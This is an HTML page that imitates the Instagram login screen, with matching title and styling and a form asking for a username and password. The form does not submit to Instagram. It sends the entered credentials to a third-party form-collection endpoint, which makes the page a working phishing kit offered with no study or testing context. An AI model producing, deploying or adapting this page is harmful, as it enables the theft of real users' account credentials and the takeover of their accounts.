<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Instagram</title>
<style>
  body{font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;background:#fff}
  .box{width:320px;padding:30px;border:1px solid #dbdbdb;border-radius:8px;text-align:center}
  h1{font-family:cursive;font-weight:400}
  input{width:100%;padding:12px;margin:6px 0;border:1px solid #dbdbdb;border-radius:6px;box-sizing:border-box;background:#fafafa}
  button{width:100%;padding:12px;margin-top:10px;background:#0095f6;color:#fff;border:0;border-radius:8px;font-weight:bold}
</style>
</head>
<body>
  <div class="box">
    <h1>Instagram</h1>
    <form action="https://formspree.io/f/xnpjbdwl" method="POST">
      <input name="username" placeholder="Phone number, username or email" required>
      <input name="password" type="password" placeholder="Password" required>
      <button type="submit">Log in</button>
    </form>
  </div>
</body>
</html>
